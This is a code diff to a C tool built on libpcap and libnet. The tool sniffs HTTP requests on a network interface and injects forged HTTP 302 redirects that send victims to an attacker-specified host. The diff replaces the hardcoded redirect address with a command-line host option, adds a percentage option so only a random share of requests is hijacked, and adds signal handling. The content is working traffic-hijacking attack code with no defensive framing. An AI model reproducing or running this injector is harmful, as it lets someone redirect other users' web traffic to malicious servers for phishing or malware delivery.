@@ -12,19 +12,37 @@
 #include <math.h>
 #include <string.h>
 #include <bsd/string.h>
+#include <getopt.h>
 
-#define HTTP302 "HTTP/1.1 302 Found\r\n" "Connection: close\r\n" "Content-Length: 0\r\n" "Location: http://203.0.113.254:8081/?%s%s\r\n"
+
+#define HTTP302 "HTTP/1.1 302 Found\r\n" "Connection: close\r\n" "Content-Length: 0\r\n" "Location: http://%s/?%s%s\r\n"
 #define PCAPFILTER "dst port 80 and tcp[tcpflags] & tcp-push != 0"
 
+/* ----Function Declear   ---- */
+/* ------------ */
 #ifdef DEBUG
 void print_packet(const u_char *packet);
 #endif
-
+static void init_arguments(int *argc, char ***argv);
 pcap_t *init_pcap_handle(const char*);
 libnet_t *init_libnet_handle();
 int inject(const u_char*, const char*, const char*);
+void show_usage();
+/* -------------- */
 
-libnet_t *l;
+/* ----Global Var Declear ---- */
+/* -------------- */
+char*           dev;
+char*           host;
+unsigned int    rnd_percent;
+pcap_t*         handle;
+libnet_t*       l;
+/* -------------- */
+
+void sig_handler(int sig)
+{
+    pcap_breakloop(handle);
+}
 
 void
 get_packet(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *packet)
@@ -100,6 +118,12 @@ get_packet(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *packe
 
 gohiject:
 
+    if(rnd_percent != 100) {
+        unsigned char rnd = random() % 100;
+        if(rnd >= rnd_percent)
+            goto skiphiject;
+    }
+
     //URI
     memcpy(http_get, payload+4, _get - payload - 13);
 
@@ -120,16 +144,27 @@ skiphiject:
 
 int main(int argc, char* argv[]) {
 
-    char* dev = argv[1];
+    init_arguments (&argc, &argv);
+
+    printf("host:%s, dev:%s, pct:%d\n", host, dev, rnd_percent);
+
+
+    if(host==NULL || dev==NULL || rnd_percent == 0) {
+        show_usage();
+        exit(EXIT_FAILURE);
+    }
+
+    //exit(0);
+    //char* dev = argv[1];
+
+    signal(SIGINT, sig_handler);
+    signal(SIGQUIT, sig_handler);
 
     l = init_libnet_handle(); 
-    pcap_t *handle = init_pcap_handle(dev);
+    handle = init_pcap_handle(dev);
     pcap_loop (handle, -1, get_packet, NULL);
 
-#ifdef DEBUG
-    fprintf(stderr, "All done, cleaning up...\n");
-#endif
-
+    fprintf(stderr, "Exit, cleaning up...\n");
     pcap_close(handle);
     libnet_destroy(l);
 
@@ -205,8 +240,9 @@ int inject(const u_char* packet, const char* http_get, const char* http_host) {
     */
 
     char payload[512];
+    char *hijakck_host = host;
 
-    sprintf(payload, HTTP302, http_host, http_get);
+    sprintf(payload, HTTP302, hijakck_host, http_host, http_get);
     size_t payload_s = strlen(payload) + 1;
 
     static libnet_ptag_t ip_tag = LIBNET_PTAG_INITIALIZER, tcp_tag = LIBNET_PTAG_INITIALIZER;
@@ -266,4 +302,62 @@ int inject(const u_char* packet, const char* http_get, const char* http_host) {
     return 0;
 }
 
+void show_usage() {
+    printf("help\n");
+}
 
+static void
+init_arguments(int *argc, char ***argv)
+{
+    extern unsigned int rnd_percent;
+    extern char        *dev;
+    extern char        *host;
+
+    /* Option struct for progrm run arguments */
+    static struct option long_options[] =
+        {
+        {"help",        no_argument,        0,              'h'},
+        {"dev",         required_argument,  0,              'd'},
+        {"host",        required_argument,  0,              'o'},
+        {"percent",     required_argument,  0,              'p'},
+        {0, 0, 0, 0}
+        };
+
+    int c;
+    while (1) {
+
+        /* getopt_long stores the option index here. */
+        int option_index = 0;
+        c = getopt_long ((*argc), (*argv), "d:o:p:h",
+                        long_options, &option_index);
+
+        if (c == -1)
+            break;
+        switch (c) {
+            case 0:
+               break;
+            case 'd':
+                dev = optarg;
+                break;
+            case 'p':
+                rnd_percent = atoi(optarg);
+                break;
+            case 'o':
+                host = optarg;
+                break;
+            case 'h':
+                show_usage();
+                exit(EXIT_SUCCESS);
+                break;
+            case '?':
+                if (optopt == 'u' || optopt == 'p'||
+                        optopt == 'g'|| optopt == 'd')
+                    fprintf (stderr, "Option -%c requires an argument.\n", optopt);
+                exit(EXIT_FAILURE);
+                break;
+            default:
+                fprintf (stderr,"Unknown option character `\\x%x'.\n", c);
+                exit(EXIT_FAILURE);
+        }
+    }
+}
